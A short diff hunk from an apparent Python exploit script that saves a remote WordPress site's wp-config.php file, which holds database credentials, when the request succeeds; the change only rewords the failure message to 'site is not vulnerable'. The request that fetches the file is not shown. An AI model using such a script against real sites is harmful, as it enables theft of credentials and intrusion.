@@ -29,4 +29,4 @@ if r.status_code == 200:
 	f = open("wp-config.php", "w")
 	f.write(str(r.text))
 else:
-  print("No exploit found")
+  print("site is not vulnerable")
